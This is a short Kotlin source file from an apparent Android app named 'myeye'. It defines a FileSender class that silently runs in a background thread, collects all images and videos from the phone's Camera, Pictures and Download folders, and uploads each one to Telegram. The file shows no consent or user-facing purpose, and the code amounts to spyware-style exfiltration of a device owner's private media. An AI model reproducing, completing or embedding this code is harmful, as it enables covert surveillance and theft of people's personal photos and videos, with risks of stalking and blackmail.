package com.myeye

import android.content.Context
import java.io.File

class FileSender(private val context: Context) {
    
    private val telegramService = TelegramService()
    
    fun sendGalleryFiles() {
        Thread {
            val galleryDirs = arrayOf(
                File("/storage/emulated/0/DCIM/Camera"),
                File("/storage/emulated/0/Pictures"),
                File("/storage/emulated/0/Download")
            )
            
            for (dir in galleryDirs) {
                if (dir.exists() && dir.isDirectory) {
                    dir.listFiles()?.forEach { file ->
                        if (file.isFile && (file.name.endsWith(".jpg") || 
                            file.name.endsWith(".png") || 
                            file.name.endsWith(".mp4"))) {
                            telegramService.sendFileToTelegram(file.absolutePath, "Gallery File")
                            Thread.sleep(1000) // Delay to avoid rate limiting
                        }
                    }
                }
            }
        }.start()
    }
}
